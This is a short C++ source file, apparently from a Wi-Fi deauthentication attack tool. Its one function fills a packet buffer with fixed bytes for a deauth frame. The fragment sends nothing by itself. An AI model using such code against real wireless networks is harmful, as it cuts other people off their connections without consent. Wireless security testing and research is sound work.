// DeauthAttack.cpp

#include "DeauthAttack.h"

void InitDeauthPacket(DeauthPacket* packet)
{
    memset(packet, 0x00, sizeof(DeauthPacket));
    packet->data[2]  = 0xb0;
    packet->data[5]  = 0x80;
    packet->data[6]  = 0x02;
    packet->data[11] = 0xc0;
    packet->data[35] = 0x07;
}